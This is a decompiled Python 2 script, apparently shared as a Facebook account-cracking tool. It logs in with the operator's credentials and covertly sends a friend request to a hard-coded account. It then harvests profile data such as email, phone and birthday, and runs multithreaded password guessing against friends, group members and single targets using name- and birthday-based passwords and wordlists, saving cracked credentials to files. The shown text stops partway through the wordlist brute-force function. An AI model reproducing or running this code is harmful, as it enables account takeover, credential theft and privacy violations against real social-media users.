#Decompiled by Hacker WaSI
#Upgraded By EvilDevil
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
    print '\x1b[1;91m[!] Exit'
    os.sys.exit()


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


logo = '\x1b[1;92m\n\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \x1b[1;93mv1.6\n\x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mHacker WaSi\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mSupport \x1b[1;91m: \x1b[1;96mEvil Devill\x1b[1;97m[\x1b[1;96m\x1b[1;97m] \x1b[1;97m/ \x1b[1;96mUSE WISELY \x1b[1;97m/ \x1b[1;96mHaCker WaSi\n\x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/evildevill\x1b[0m\n[*] Decompiled by WaSim AkraM\n'

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mCurrently Entering COK \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idteman = []
idfromteman = []
idmem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'


def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN FACEBOOK ACCOUNT FB ACCOUNT \x1b[1;91m[\xe2\x98\x86]'
        id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername FB \x1b[1;91m:\x1b[1;92m ')
        pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword FB \x1b[1;91m:\x1b[1;92m ')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;91m[!] No connection'
            keluar()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin successful'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                os.system('xdg-open https://www.youtube.com/channel/UC0bX56PZ_nMZw3t4p90SYyQ')
                time.sleep(2)
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m[!] No connection'
                keluar()

        if 'checkpoint' in url:
            print '\n\x1b[1;91m[!] \x1b[1;93mAccounts are subject to Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print '\n\x1b[1;91m[!] Login Failed'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
        except KeyError:
            os.system('clear')
            print '\x1b[1;91m[!] \x1b[1;93mLooks like the account hit Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[!] No connection'
            keluar()

    os.system('clear')
    print logo
    print '\x1b[1;97m\xe2\x95\x94' + 40 * '\xe2\x95\x90'
    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Name \x1b[1;91m: \x1b[1;92m' + Name
    print '\x1b[1;97m\xe2\x95\x9a' + 40 * '\xe2\x95\x90'
    print '\x1b[1;37;40m1. User Information'
    print '\x1b[1;37;40m2. Hack Facebook Account'
    print '\x1b[1;37;40m3. Bot               '
    print '\x1b[1;37;40m4. Others....       '
    print '\x1b[1;37;40m5. LogOut            '
    print '\x1b[1;31;40m0. Exit            '
    print
    select()


def select():
    zedd = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if zedd == '':
        print '\x1b[1;91m[!] Jangan kosong'
        select()
    else:
        if zedd == '1':
            informasi()
        else:
            if zedd == '2':
                menu_hack()
            else:
                if zedd == '3':
                    menu_bot()
                else:
                    if zedd == '4':
                        lain()
                    else:
                        if zedd == '5':
                            os.system('rm -rf login.txt')
                            os.system('xdg-open https://www.youtube.com/channel/UC0bX56PZ_nMZw3t4p90SYyQ')
                            Exit()
                        else:
                            if zedd == '0':
                                Exit()
                            else:
                                print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + zedd + ' \x1b[1;91mThere is no'
                                select()


def informasi():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID\x1b[1;97m/\x1b[1;92mNama\x1b[1;91m : \x1b[1;97m')
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads(r.text)
    for p in cok['data']:
        if id in p['name'] or id in p['id']:
            r = requests.get('https://graph.facebook.com/' + p['id'] + '?access_token=' + toket)
            z = json.loads(r.text)
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            try:
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mName\x1b[1;97m          : ' + z['name']
            except KeyError:
                print '\x1b[1;91m[?] \x1b[1;92mName\x1b[1;97m          : \x1b[1;91mThere is nothing'
            else:
                try:
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID\x1b[1;97m            : ' + z['id']
                except KeyError:
                    print '\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m            : \x1b[1;91mThere is Nothing'
                else:
                    try:
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail\x1b[1;97m         : ' + z['email']
                    except KeyError:
                        print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m         : \x1b[1;91mThere is Nothing'
                    else:
                        try:
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mMobile phone number\x1b[1;97m      : ' + z['mobile_phone']
                        except KeyError:
                            print '\x1b[1;91m[?] \x1b[1;92mMobile phone number\x1b[1;97m      : \x1b[1;91mThere is Nothing'

                        try:
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mLocation\x1b[1;97m        : ' + z['location']['name']
                        except KeyError:
                            print '\x1b[1;91m[?] \x1b[1;92mLocation\x1b[1;97m        : \x1b[1;91mThere is nothing'

                    try:
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mDate of birth\x1b[1;97m : ' + z['birthday']
                    except KeyError:
                        print '\x1b[1;91m[?] \x1b[1;92mDate of birth\x1b[1;97m : \x1b[1;91mThere is nothing'

                try:
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mSchool\x1b[1;97m       : '
                    for q in z['education']:
                        try:
                            print '\x1b[1;91m                   ~ \x1b[1;97m' + q['school']['name']
                        except KeyError:
                            print '\x1b[1;91m                   ~ \x1b[1;91mThere is nothing'

                except KeyError:
                    pass

            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
    else:
        print '\x1b[1;91m[\xe2\x9c\x96] User not found'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        menu()


def menu_hack():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. Mini Hack Facebook(\x1b[1;92mTarget\x1b[1;97m)'
    print '\x1b[1;37;40m2. Multi Bruteforce Facebook'
    print '\x1b[1;37;40m3. Super Multi Bruteforce Facebook'
    print '\x1b[1;37;40m4. BruteForce(\x1b[1;92mTarget\x1b[1;97m)'
    print '\x1b[1;37;40m5. Yahoo Checker'
    print '\x1b[1;37;40m6. Get id/email/hp'
    print '\x1b[1;31;40m0. Back'
    print
    hack_select()


def hack_select():
    hack = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if hack == '':
        print '\x1b[1;91m[!] Do not empty'
        hack_select()
    else:
        if hack == '1':
            mini()
        else:
            if hack == '2':
                crack()
                hasil()
            else:
                if hack == '3':
                    super()
                else:
                    if hack == '4':
                        brute()
                    else:
                        if hack == '5':
                            menu_yahoo()
                        else:
                            if hack == '6':
                                grab()
                            else:
                                if hack == '0':
                                    menu()
                                else:
                                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + hack + ' \x1b[1;91mThere is nothing'
                                    hack_select()

def mini():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] select'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;91m[ INFO ] The target account must be friends with your account first !'
        try:
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
            a = json.loads(r.text)
            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mName\x1b[1;97m : ' + a['name']
            jalan('\x1b[1;91m[+] \x1b[1;92mCheck \x1b[1;97m...')
            time.sleep(2)
            jalan('\x1b[1;91m[+] \x1b[1;92mUnlock security \x1b[1;97m...')
            time.sleep(2)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease Wait a minute \x1b[1;97m...')
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            pz1 = a['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            y = json.load(data)
            if 'access_token' in y:
                print '\x1b[1;91m[+] \x1b[1;92mFound.'
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                menu_hack()
            else:
                if 'www.facebook.com' in y['error_msg']:
                    print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                    print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                    menu_hack()
                else:
                    pz2 = a['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    y = json.load(data)
                    if 'access_token' in y:
                        print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                        menu_hack()
                    else:
                        if 'www.facebook.com' in y['error_msg']:
                            print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                            print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                            menu_hack()
                        else:
                            pz3 = a['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            y = json.load(data)
                            if 'access_token' in y:
                                print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
                                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                menu_hack()
                            else:
                                if 'www.facebook.com' in y['error_msg']:
                                    print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                                    print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
                                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
                                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                    menu_hack()
                                else:
                                    lahir = a['birthday']
                                    pz4 = lahir.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    y = json.load(data)
                                    if 'access_token' in y:
                                        print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
                                        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                        menu_hack()
                                    else:
                                        if 'www.facebook.com' in y['error_msg']:
                                            print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                                            print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
                                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
                                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
                                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
                                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                            menu_hack()
                                        else:
                                            print '\x1b[1;91m[!] Maaf, gagal membuka password target :('
                                            print '\x1b[1;91m[!] Cobalah dengan cara lain.'
                                            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                                            menu_hack()
        except KeyError:
            print '\x1b[1;91m[!] Terget tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_hack()


def crack():
    global file
    global idlist
    global passw
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        idlist = raw_input('\x1b[1;91m[+] \x1b[1;92mFile ID  \x1b[1;91m: \x1b[1;97m')
        passw = raw_input('\x1b[1;91m[+] \x1b[1;92mPassword \x1b[1;91m: \x1b[1;97m')
        try:
            file = open(idlist, 'r')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
            for x in range(40):
                zedd = threading.Thread(target=scrak, args=())
                zedd.start()
                threads.append(zedd)

            for zedd in threads:
                zedd.join()

        except IOError:
            print '\x1b[1;91m[!] File tidak ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_hack()


def scrak():
    global back
    global berhasil
    global cekpoint
    global gagal
    global up
    try:
        buka = open(idlist, 'r')
        up = buka.read().split()
        while file:
            username = file.readline().strip()
            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            data = urllib.urlopen(url)
            mpsh = json.load(data)
            if back == len(up):
                break
            if 'access_token' in mpsh:
                bisa = open('Berhasil.txt', 'w')
                bisa.write(username + ' | ' + passw + '\n')
                bisa.close()
                berhasil.append('\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + username + ' | ' + passw)
                back += 1
            else:
                if 'www.facebook.com' in mpsh['error_msg']:
                    cek = open('Cekpoint.txt', 'w')
                    cek.write(username + ' | ' + passw + '\n')
                    cek.close()
                    cekpoint.append('\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + username + ' | ' + passw)
                    back += 1
                else:
                    gagal.append(username)
                    back += 1
            sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack    \x1b[1;91m:\x1b[1;97m ' + str(back) + ' \x1b[1;96m>\x1b[1;97m ' + str(len(up)) + ' =>\x1b[1;92mLive\x1b[1;91m:\x1b[1;96m' + str(len(berhasil)) + ' \x1b[1;97m=>\x1b[1;93mCheck\x1b[1;91m:\x1b[1;96m' + str(len(cekpoint)))
            sys.stdout.flush()

    except IOError:
        print '\n\x1b[1;91m[!] Koneksi terganggu'
        time.sleep(1)
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m[\xe2\x9c\x96] There is nothing koneksi'


def hasil():
    print
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    for b in berhasil:
        print b

    for c in cekpoint:
        print c

    print
    print '\x1b[31m[x] Gagal \x1b[1;97m--> ' + str(len(gagal))
    keluar()


def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 40 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;37;40m1. Crack dari daftar Teman'
    print '\x1b[1;37;40m2. Crack dari member Grup'
    print '\x1b[1;31;40m0. Back'
    print
    select_super()


def select_super():
    peak = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
    if peak == '':
        print '\x1b[1;91m[!] Jangan kosong'
        select_super()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil id teman \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        else:
            if peak == '2':
                os.system('clear')
                print logo
                print 40 * '\x1b[1;97m\xe2\x95\x90'
                idg = raw_input('\x1b[1;91m[+] \x1b[1;92mID Grup   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
                except KeyError:
                    print '\x1b[1;91m[!] Grup tidak ditemukan'
                    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                    super()

                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])

            else:
                if peak == '0':
                    menu_hack()
                else:
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mThere is nothing'
                    select_super()
    print '\x1b[1;91m[+] \x1b[1;92mJumlah ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCrack \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    print 40 * '\x1b[1;97m\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass1
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass1
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass2
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass2
                        else:
                            pass3 = b['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass3
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass3
                                else:
                                    lahir = b['birthday']
                                    pass4 = lahir.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass4
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass4
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    super()


def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 40 * '\x1b[1;97m\xe2\x95\x90'
        try:
            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail\x1b[1;97m/\x1b[1;92mHp \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print 40 * '\x1b[1;97m\xe2\x95\x90'
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            print '\x1b[1;91m[+] \x1b[1;92mJumlah\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mMencoba \x1b[1;97m' + pw)
